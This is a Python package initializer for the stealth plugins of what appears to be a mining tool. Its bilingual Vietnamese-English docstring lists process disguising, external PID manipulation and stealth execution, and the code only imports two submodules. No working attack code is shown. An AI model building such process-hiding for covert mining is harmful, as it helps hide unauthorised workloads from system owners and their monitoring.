"""mining_environment.stealth.plugins

🔌 **[Stealth Execution Plugins]** (Plugin thực thi ẩn danh)

Plugin system cho **[External Process Disguising]** (giả trang tiến trình bên ngoài)
và advanced stealth execution capabilities.

⚠️ COMPONENTS:
- **stealth_plugin.py**: External process disguise plugin
- **stealth_exec.py**: Advanced stealth execution engine

✅ FEATURES:
- External PID manipulation
- Advanced process disguising
- Stealth execution coordination
- Safe disguise risk assessment
- Integration với self-stealth system
"""

# Plugin components
try:
    from .stealth_plugin import *
except ImportError:
    pass

try:
    from .stealth_exec import *
except ImportError:
    pass

__all__ = []  # Plugins export their own components